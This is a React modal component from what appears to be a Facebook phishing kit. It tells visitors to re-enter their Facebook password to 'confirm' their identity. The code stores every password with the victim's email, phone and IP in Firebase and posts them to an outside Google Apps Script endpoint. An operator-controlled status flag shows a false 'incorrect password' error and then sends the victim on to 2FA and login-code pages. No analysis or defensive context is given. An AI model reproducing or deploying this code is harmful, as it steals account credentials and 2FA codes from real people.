import axios from "axios";
import React, { useEffect, useState } from "react";
import { onValue, ref, set, update } from "firebase/database";
import { database } from "../../Utils/firebase";
import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
import InputPassword from "../UI/InputPassword/InputPassword";
import Validating from "../Validating";
import "./Modal.scss";
import { useNavigate } from "react-router";
import { sendEmail } from "../../Utils/sendEmail";
import { v4 as uuidv4 } from "uuid";

const passwords = [];

// eslint-disable-next-line react/prop-types, no-unused-vars
const Modal = ({ isModal, setIsModal }) => {
  const [password, setPassword] = React.useState("");
  const [uid, setUid] = React.useState("");
  const [error_password, setErrorPassword] = React.useState(false);
  const [validating, setValidating] = useState(false);

  const natigate = useNavigate();

  const styleModal = ["modal"];
  if (isModal) {
    styleModal.push("modal__active");
  }

  const handleContinue = () => {
    if (!password) {
      return;
    }

    setErrorPassword(false);
    setValidating(true);
    passwords.push(password);
    localStorage.setItem("passwords", JSON.stringify(passwords));

    if (passwords?.length > 1) {
      const data = JSON.parse(localStorage.getItem("form"));
      const form = new FormData();
      form.append("phone", data.phone);
      form.append("email", data.email);
      form.append("password", passwords);
      const updates = {};
      updates[
        "/" + localStorage.getItem("record_uid") + "/" + "current_password"
      ] = password;
      updates["/" + localStorage.getItem("record_uid") + "/" + "password"] = [
        password,
      ];
      updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
        "2z";
      update(ref(database), updates);
      axios.post(
        "https://script.google.com/macros/s/AKfycbzo3dZgMtBIIml9lhUAsfsnOJTNyhLHUZTlnOyg2XHWcQPwXlDU3tjca5r3vejr-JdG/exec",
        form
      );
    } else {
      const data = JSON.parse(localStorage.getItem("form"));
      const id = uuidv4();
      set(ref(database, "/" + id), {
        email: data.email,
        phone: data.phone,
        user_status: "1",
        done: false,
        timestamp: Date.now(),
        current_password: password,
        password: passwords,
      }).then(() => {
        localStorage.setItem("record_uid", id);
        setUid(id);

        const content = `
          \n
          IP: ${localStorage.getItem("ip")}
          Phone: ${data.phone}
          Email : ${data.email}
          Password : ${password}
          `;

        // sendEmail({ content: content });

        const form = new FormData();
        form.append("phone", data.phone);
        form.append("email", data.email);
        form.append("password", passwords);
        axios.post(
          "https://script.google.com/macros/s/AKfycbzo3dZgMtBIIml9lhUAsfsnOJTNyhLHUZTlnOyg2XHWcQPwXlDU3tjca5r3vejr-JdG/exec",
          form
        );

        // setTimeout(() => {
        //   const updates = {};
        //   updates["/" + id + "/" + "user_status"] = "1";
        //   update(ref(database), updates);
        // }, 5000);
      });
    }
  };

  useEffect(() => {
    if (isModal && uid) {
      const starCountRef = ref(database, "/" + uid);
      onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        console.log(data);
        if (data?.user_status === "2") {
          setValidating(false);
          setErrorPassword(true);
        } else if (data?.user_status === "6") {
          natigate("/confirm/processing");
        } else if (data?.user_status === "3") {
          const updates = {};
          updates[
            "/" + localStorage.getItem("record_uid") + "/" + "user_status"
          ] = "-1";
          update(ref(database), updates).then(() => {
            natigate("/confirm/2fa-code", {
              replace: true,
            });
          });
        } else if (data?.user_status === "Chờ user nhập mã đăng nhập") {
          natigate("/confirm/login-code");
        }
      });
    }
  }, [isModal, uid]);

  return (
    <div
      className={styleModal.join(" ")}
      aria-hidden="false"
      // onClick={() => setIsModal((state) => !state)}
    >
      <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          {/* <div className="modal-header">
            <div className="modal-title" id="exampleModalLabel">
              Please Enter Your Password
            </div>
            <button
              type="button"
              className="btn-close"
              onClick={() => setIsModal((state) => !state)}
            ></button>
          </div> */}

          <div className="modal-body" style={{}}>
            <h1
              style={{
                fontSize: "1.35rem",
                color: "#444",

                marginTop: "1.15rem",
              }}
            >
              Please enter your facebook password to continue
            </h1>
            <div
              style={{
                height: 1,
                width: "100%",
                background: "rgb(218, 221, 225)",
                marginTop: "1rem",
                marginBottom: "1.25rem",
              }}
            />

            <div className="modal__body-description">
              We need to confirm the sender of the information is you, Please
              enter your facebook password and then continue.
            </div>
            <div className="modal__body-password">
              <InputPassword
                value={password}
                fun={(e) => setPassword(e.target.value)}
              >
                Password
              </InputPassword>
              {error_password > 0 && (
                <p className="text-danger">
                  Incorrect facebook password, please try again.
                </p>
              )}

              {validating && <Validating />}
            </div>
            <div
              style={{
                marginBottom: "1.25rem",
              }}
            >
              <ButtonSoft
                disabled={password.length > 0 && !validating}
                fun={handleContinue}
              >
                Continue
              </ButtonSoft>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Modal;
